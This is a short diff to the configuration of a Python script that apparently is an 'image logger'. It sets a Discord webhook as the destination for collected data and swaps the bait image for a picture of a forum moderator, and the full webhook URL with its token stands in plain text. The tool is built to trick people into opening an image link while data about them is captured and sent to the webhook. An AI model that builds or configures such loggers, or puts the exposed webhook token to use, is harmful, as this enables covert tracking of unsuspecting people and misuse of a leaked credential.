@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1453864207454830733/JdCQS1a6xi7dVwUTcbuSf6_xubOOHsiq1O6fzGUaS6VCgDxlfI-qS9DRJr7Njm1kkH04",
-    "image": "https://media.tenor.com/MHdZbqfnnhAAAAAe/stare-discord-mod.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.shutterstock.com/image-illustration/illustration-stereotypical-internet-forum-moderator-260nw-2658662529.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
